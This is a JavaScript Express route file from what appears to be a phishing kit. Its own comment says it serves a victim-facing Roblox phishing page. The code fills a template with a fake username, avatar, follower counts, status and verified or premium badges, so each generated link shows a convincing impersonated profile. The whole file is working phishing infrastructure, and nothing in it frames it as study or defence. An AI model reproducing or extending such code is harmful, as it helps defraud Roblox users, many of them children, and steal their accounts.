// [routes/phish.js — serve victim-facing Roblox phish page]
const express = require('express');
const path    = require('path');
const fs      = require('fs');
const db      = require('../db/init');
const router  = express.Router();

const TEMPLATE = path.join(__dirname, '../views/phish/roblox.html');

function render(template, link) {
  const statusClass = { Online: 'online', Offline: 'offline', 'In Studio': 'studio' }[link.status] || 'online';

  let html = template
    .replace(/\{\{FAKE_USERNAME\}\}/g,  escHtml(link.fake_username))
    .replace(/\{\{DISPLAY_NAME\}\}/g,   escHtml(link.display_name))
    .replace(/\{\{AVATAR_URL\}\}/g,     link.avatar_url || '')
    .replace(/\{\{FRIENDS\}\}/g,        link.friends.toLocaleString())
    .replace(/\{\{FOLLOWING\}\}/g,      link.following.toLocaleString())
    .replace(/\{\{FOLLOWERS\}\}/g,      link.followers.toLocaleString())
    .replace(/\{\{STATUS\}\}/g,         escHtml(link.status))
    .replace(/\{\{STATUS_CLASS\}\}/g,   statusClass)
    .replace(/\{\{LINK_ID\}\}/g,        link.id)
    .replace(/\{\{BIRTHDAY\}\}/g,       link.birthday || '2000-01-01')
    .replace(/\{\{DOMAIN\}\}/g,         link.domain || '');

  // conditional blocks {{#IF_VERIFIED}} ... {{/IF_VERIFIED}}
  if (link.verified) {
    html = html.replace(/\{\{#IF_VERIFIED\}\}([\s\S]*?)\{\{\/IF_VERIFIED\}\}/g, '$1');
  } else {
    html = html.replace(/\{\{#IF_VERIFIED\}\}[\s\S]*?\{\{\/IF_VERIFIED\}\}/g, '');
  }

  if (link.premium) {
    html = html.replace(/\{\{#IF_PREMIUM\}\}([\s\S]*?)\{\{\/IF_PREMIUM\}\}/g, '$1');
  } else {
    html = html.replace(/\{\{#IF_PREMIUM\}\}[\s\S]*?\{\{\/IF_PREMIUM\}\}/g, '');
  }

  return html;
}

function escHtml(s) {
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

router.get('/:linkId', (req, res) => {
  const link = db.prepare('SELECT * FROM links WHERE id=?').get(req.params.linkId);
  if (!link) return res.status(404).sendFile(path.join(__dirname,'../views/phish/404.html'), err => {
    if (err) res.status(404).send('<h2 style="font-family:sans-serif;text-align:center;margin-top:20vh;color:#888">Page not found</h2>');
  });

  const template = fs.readFileSync(TEMPLATE, 'utf8');
  res.send(render(template, link));
});

module.exports = router;
